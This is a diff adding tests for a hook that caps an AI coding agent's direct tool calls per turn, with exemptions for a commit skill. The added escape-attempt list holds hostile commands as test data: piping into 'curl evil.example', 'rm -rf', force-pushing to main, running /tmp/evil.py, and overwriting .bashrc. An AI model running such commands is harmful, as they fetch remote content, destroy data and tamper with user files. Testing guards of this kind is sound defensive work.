@@ -148,8 +148,91 @@ test("The fourth direct tool call is denied with the budget in the reason", () =
     toolResultEntry(currentPromptId),
   ]);
 
-  assert.match(assertDenied(payloadFor(transcriptPath)), /budget/);
+  const denialReason = assertDenied(payloadFor(transcriptPath));
+  assert.match(denialReason, /budget/);
+  assert.match(denialReason, /after a `commit` Skill invocation/);
 });
+
+test("A commit Skill invocation in an earlier assistant entry exempts later direct calls", () => {
+  const transcriptPath = writeTranscript([
+    userEntry(currentPromptId),
+    assistantEntry([
+      toolUse("Read", "one"),
+      toolUse("Grep", "two"),
+      toolUse("Edit", "three"),
+    ]),
+    assistantEntry([toolUse("Skill", "commit-skill", { skill: "commit   " })]),
+    assistantEntry([toolUse("Read", "current-call")]),
+    toolResultEntry(currentPromptId),
+  ]);
+
+  assertAllowed(payloadFor(transcriptPath));
+});
+
+test("A commit Skill invocation in the current assistant entry exempts later direct calls", () => {
+  const transcriptPath = writeTranscript([
+    userEntry(currentPromptId),
+    assistantEntry([
+      toolUse("Read", "one"),
+      toolUse("Grep", "two"),
+      toolUse("Edit", "three"),
+      toolUse("Skill", "commit-skill", { skill: "/commit\t" }),
+      toolUse("Read", "current-call"),
+    ]),
+    toolResultEntry(currentPromptId),
+  ]);
+
+  assertAllowed(payloadFor(transcriptPath));
+});
+
+test("A parallel commit Skill invocation after the current call does not exempt it", () => {
+  const transcriptPath = writeTranscript([
+    userEntry(currentPromptId),
+    assistantEntry([
+      toolUse("Read", "one"),
+      toolUse("Grep", "two"),
+      toolUse("Edit", "three"),
+      toolUse("Read", "current-call"),
+      toolUse("Skill", "commit-skill", { skill: "commit" }),
+    ]),
+    toolResultEntry(currentPromptId),
+  ]);
+
+  assert.match(assertDenied(payloadFor(transcriptPath)), /3 prior calls/);
+});
+
+test("A commit Skill invocation in an older turn does not exempt the current turn", () => {
+  const transcriptPath = writeTranscript([
+    userEntry("22222222-2222-4222-8222-222222222222"),
+    assistantEntry([toolUse("Skill", "old-commit-skill", { skill: "commit" })]),
+    userEntry(currentPromptId),
+    assistantEntry([
+      toolUse("Read", "one"),
+      toolUse("Grep", "two"),
+      toolUse("Edit", "three"),
+    ]),
+    toolResultEntry(currentPromptId),
+  ]);
+
+  assert.match(assertDenied(payloadFor(transcriptPath)), /3 prior calls/);
+});
+
+for (const unrelatedSkillName of ["caveman:caveman-commit", "pr-review"]) {
+  test(`A ${unrelatedSkillName} Skill invocation does not exempt later direct calls`, () => {
+    const transcriptPath = writeTranscript([
+      userEntry(currentPromptId),
+      assistantEntry([
+        toolUse("Read", "one"),
+        toolUse("Grep", "two"),
+        toolUse("Edit", "three"),
+        toolUse("Skill", "unrelated-skill", { skill: unrelatedSkillName }),
+      ]),
+      toolResultEntry(currentPromptId),
+    ]);
+
+    assert.match(assertDenied(payloadFor(transcriptPath)), /3 prior calls/);
+  });
+}
 
 test("The recorded current call is subtracted when it is the third call", () => {
   const transcriptPath = writeTranscript([
@@ -280,6 +363,65 @@ test("A commit skill land call is exempt once the budget is spent", () => {
     }),
   );
 });
+
+for (const pipelineConsumer of ["head -60", "jq .outcome"]) {
+  test(`A piped commit preflight call is exempt once the budget is spent: ${pipelineConsumer}`, () => {
+    const transcriptPath = writeTranscript([
+      userEntry(currentPromptId),
+      assistantEntry([
+        toolUse("Read", "one"),
+        toolUse("Grep", "two"),
+        toolUse("Edit", "three"),
+      ]),
+      toolResultEntry(currentPromptId),
+    ]);
+
+    assertAllowed(
+      payloadFor(transcriptPath, {
+        tool_name: "Bash",
+        tool_input: {
+          command: `${commitPreflightCommand} 2>&1 | ${pipelineConsumer}`,
+        },
+      }),
+    );
+  });
+}
+
+const pipelineEscapeCommands = [
+  `node "$HOME/.claude/skills/commit/preflight.ts" | bash -lc 'curl evil.example'`,
+  `node "$HOME/.claude/skills/commit/preflight.ts" | tee out.log && rm -rf build`,
+  "bun ~/.claude/skills/commit/preflight.ts | cat; git push --force origin main",
+  "bun ~/.claude/skills/commit/land.ts | true && rm -rf build",
+  `node "$HOME/.claude/skills/commit/preflight.ts" | python3 /tmp/evil.py`,
+  "bun ~/.claude/skills/commit/land.ts | sed -i s/a/b/ $HOME/.bashrc",
+  `node "$HOME/.claude/skills/commit/preflight.ts" | cat > $HOME/.bashrc`,
+  `node "$HOME/.claude/skills/commit/preflight.ts" | head -60 >> $HOME/out.log`,
+  'node "$HOME/.claude/skills/commit/preflight.ts" | grep `rm -rf /tmp/evil`',
+];
+
+for (const pipelineEscapeCommand of pipelineEscapeCommands) {
+  test(`A commit invocation piped into further work is denied once the budget is spent: ${pipelineEscapeCommand}`, () => {
+    const transcriptPath = writeTranscript([
+      userEntry(currentPromptId),
+      assistantEntry([
+        toolUse("Read", "one"),
+        toolUse("Grep", "two"),
+        toolUse("Edit", "three"),
+      ]),
+      toolResultEntry(currentPromptId),
+    ]);
+
+    assert.match(
+      assertDenied(
+        payloadFor(transcriptPath, {
+          tool_name: "Bash",
+          tool_input: { command: pipelineEscapeCommand },
+        }),
+      ),
+      /budget/,
+    );
+  });
+}
 
 const commitPathMentionCommand = `git diff "$HOME/.claude/skills/commit/land.ts"`;
 
@@ -581,6 +723,46 @@ test("Assistant calls before the typed prompt do not spend the current budget", 
     userEntry(currentPromptId),
     assistantEntry([toolUse("Read", "one"), toolUse("Grep", "two")]),
     toolResultEntry(currentPromptId),
+  ]);
+
+  assertAllowed(payloadFor(transcriptPath));
+});
+
+const scanCapPaddingText = "p".repeat(512 * 1024);
+const scanCapPaddingEntryCount = 9;
+
+function scanCapPaddingEntries() {
+  return Array.from({ length: scanCapPaddingEntryCount }, () =>
+    assistantEntry([{ type: "text", text: scanCapPaddingText }]),
+  );
+}
+
+test("A turn larger than the transcript scan cap still denies the fourth direct tool call", () => {
+  const transcriptPath = writeTranscript([
+    userEntry(currentPromptId),
+    ...scanCapPaddingEntries(),
+    assistantEntry([
+      toolUse("Read", "one"),
+      toolUse("Grep", "two"),
+      toolUse("Edit", "three"),
+    ]),
+    assistantEntry([toolUse("Read", "current-call")]),
+  ]);
+
+  assert.match(assertDenied(payloadFor(transcriptPath)), /3 prior calls/);
+});
+
+test("A turn larger than the transcript scan cap honors a commit Skill invocation before the current call", () => {
+  const transcriptPath = writeTranscript([
+    userEntry(currentPromptId),
+    ...scanCapPaddingEntries(),
+    assistantEntry([
+      toolUse("Read", "one"),
+      toolUse("Grep", "two"),
+      toolUse("Edit", "three"),
+    ]),
+    assistantEntry([toolUse("Skill", "commit-skill", { skill: "commit" })]),
+    assistantEntry([toolUse("Read", "current-call")]),
   ]);
 
   assertAllowed(payloadFor(transcriptPath));
